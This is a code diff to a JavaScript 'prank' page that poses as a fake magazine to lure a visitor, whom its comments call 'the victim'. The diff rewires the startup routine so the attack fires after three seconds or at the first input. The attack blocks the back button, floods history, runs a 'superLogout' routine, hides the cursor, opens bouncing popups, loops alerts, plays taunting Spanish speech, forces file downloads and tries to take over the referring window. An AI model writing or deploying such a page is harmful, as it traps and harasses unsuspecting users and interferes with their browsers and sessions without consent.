@@ -288,50 +288,45 @@ function initChildWindow () {
 
 /**
  * Initialization code for parent windows.
- * Everything auto-starts on page load. No click needed.
+ * Gives the victim 3 seconds to see the fake magazine before unleashing chaos.
  */
 function initParentWindow () {
-  // === PHASE 1: Immediate (no user gesture needed) ===
+  // Silent background setup
   blockBackButton()
   fillHistory()
   superLogout()
+
+  // Wait 3 seconds before unleashing the prank
+  setTimeout(() => {
+    startPrankChaos()
+  }, 3000)
+
+  // OR unleash immediately if they click, scroll, touch, or type before 3 seconds
+  interceptUserInput(event => {
+    unlockAudio()
+    startPrankChaos()
+  })
+}
+
+function startPrankChaos () {
+  if (window._prankStarted) return
+  window._prankStarted = true
+
   rainbowThemeColor()
   animateUrlWithEmojis()
-
-  // Start bouncing video screen immediately!
   startAutoVideo()
+  document.body.classList.add('activated')
+  hideCursor()
 
-  // Try unmuted speech immediately
   speak('Eso fue un error')
-  setTimeout(() => { speak('jajajaja caíste hermano') }, 2000)
+  setTimeout(() => { speak('te la re creíste jajajaja') }, 1500)
 
-  // Start file downloads immediately
-  setTimeout(() => { triggerFileDownload() }, 1000)
-
-  // Add the blur, shake, scrolling text & chaos animation almost immediately
-  setTimeout(() => { document.body.classList.add('activated') }, 300)
-
-  // Hide cursor immediately
-  setTimeout(() => { hideCursor() }, 500)
-
-  // === PHASE 2: On ANY mouse movement or gesture — unmute & unleash ===
-  interceptUserInput(event => {
-    // Unmute ALL videos instantly on first gesture (mousemove, scroll, touch, key)
-    document.querySelectorAll('video').forEach(v => {
-      v.muted = false
-      v.volume = 1.0
-      v.play().catch(() => {})
-    })
-
-    if (interactionCount === 1) {
-      playAnnoyingSynthMusic()
-      registerProtocolHandlers()
-      attemptToTakeoverReferrerWindow()
-      openWindow()
-      startAlertInterval()
-      speak('te la re creíste jajajaja')
-    }
-  })
+  playAnnoyingSynthMusic()
+  registerProtocolHandlers()
+  attemptToTakeoverReferrerWindow()
+  openWindow() // Opens child popup window that bounces with moveWindowBounce()!
+  startAlertInterval()
+  triggerFileDownload()
 }
 
 /**
